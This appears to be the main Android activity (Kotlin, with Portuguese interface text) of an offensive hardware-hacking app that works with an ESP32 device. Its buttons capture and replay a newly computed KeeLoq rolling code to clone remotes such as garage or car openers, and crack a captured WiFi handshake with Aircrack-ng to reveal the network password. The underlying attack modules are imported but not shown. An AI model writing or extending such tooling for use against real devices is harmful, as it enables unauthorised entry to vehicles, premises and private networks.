package com.crazycat.app

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.lifecycle.lifecycleScope
import com.crazycat.app.api.Esp32Client
import com.crazycat.app.tools.AircrackRunner
import com.crazycat.app.tools.SubGhzProcessor
import kotlinx.coroutines.launch
import java.io.File

class MainActivity : AppCompatActivity() {

    private lateinit var tvStatus: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvStatus = findViewById(R.id.tvStatus)
        requestPermissions()

        // Exemplo: Botão de Clone Rolling Code
        findViewById<Button>(R.id.btnCloneRolling).setOnClickListener {
            cloneRollingCode()
        }

        // Exemplo: Botão de Quebrar WiFi
        findViewById<Button>(R.id.btnCrackWifi).setOnClickListener {
            crackWifiHandshake()
        }
    }

    private fun cloneRollingCode() {
        lifecycleScope.launch {
            tvStatus.text = "Capturando sinal do ESP32..."
            val timings = Esp32Client.getCapturedSignal()
            
            if (timings != null) {
                tvStatus.text = "Processando Keeloq..."
                val result = SubGhzProcessor.processRollingCode(timings)
                
                if (result != null) {
                    val (protocol, newTimings) = result
                    tvStatus.text = "Enviando novo código válido para o ESP32..."
                    val success = Esp32Client.transmitSignal(protocol.frequency, newTimings)
                    
                    tvStatus.text = if (success) "Sinal Clonado Transmitido!" else "Erro ao transmitir"
                } else {
                    tvStatus.text = "Protocolo não identificado"
                }
            } else {
                tvStatus.text = "Erro de conexão com o ESP32"
            }
        }
    }

    private fun crackWifiHandshake() {
        lifecycleScope.launch {
            tvStatus.text = "Baixando PCAP do ESP32..."
            val pcapData = Esp32Client.downloadPcap()
            
            if (pcapData != null) {
                val pcapFile = File(cacheDir, "handshake.pcap")
                pcapFile.writeBytes(pcapData)
                
                tvStatus.text = "Executando Aircrack-ng..."
                AircrackRunner.crackHandshake(this@MainActivity, pcapFile) { password ->
                    runOnUiThread {
                        tvStatus.text = if (password != null) "Senha Encontrada: $password" else "Senha não encontrada na Wordlist"
                    }
                }
            } else {
                tvStatus.text = "Falha ao baixar Handshake"
            }
        }
    }

    private fun requestPermissions() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.NEARBY_WIFI_DEVICES), 1)
        }
    }
}
